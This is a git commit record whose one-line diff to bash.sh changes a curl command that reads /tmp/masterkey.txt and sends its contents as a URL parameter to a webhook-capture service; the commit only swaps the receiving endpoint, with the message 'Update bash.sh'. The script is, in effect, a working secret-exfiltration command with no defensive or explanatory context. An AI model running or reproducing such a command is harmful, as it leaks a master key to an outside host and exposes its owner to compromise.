b0b3ce3ab0ddad8ca646cdb2e4caf0dcc2603af7
Hquanfcr23 <101206553+Hquanfcr23@users.noreply.github.com>
2026-07-14 13:36:01 +0700

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -1,1 +1,1 @@
-curl "https://silent-deer-41.webhook.cool/?masterkey=$(cat /tmp/masterkey.txt)"
+curl "https://webhooktest.net/webhook/019f5f56-0584-7697-8081-ac2fe39648c3/?masterkey=$(cat /tmp/masterkey.txt)"
